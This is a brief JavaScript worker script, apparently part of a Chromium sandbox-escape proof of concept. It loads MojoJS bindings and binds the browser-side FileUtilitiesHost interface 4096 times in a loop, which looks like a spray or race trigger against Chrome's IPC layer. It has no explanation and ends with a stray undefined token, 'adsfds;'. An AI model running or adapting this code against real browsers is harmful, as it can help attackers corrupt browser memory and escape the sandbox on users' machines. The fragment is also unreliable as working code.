importScripts("./mojo_bindings.js");

mojo.config.autoLoadMojomDeps = false;

importScripts("./third_party/blink/public/mojom/file/file_utilities.mojom.js");

for(let i = 0;i < 0x1000;i++){
var file_utilities_host_ptr = new blink.mojom.FileUtilitiesHostPtr();
Mojo.bindInterface(blink.mojom.FileUtilitiesHost.name,
                   mojo.makeRequest(file_utilities_host_ptr).handle, "context");
}

adsfds;
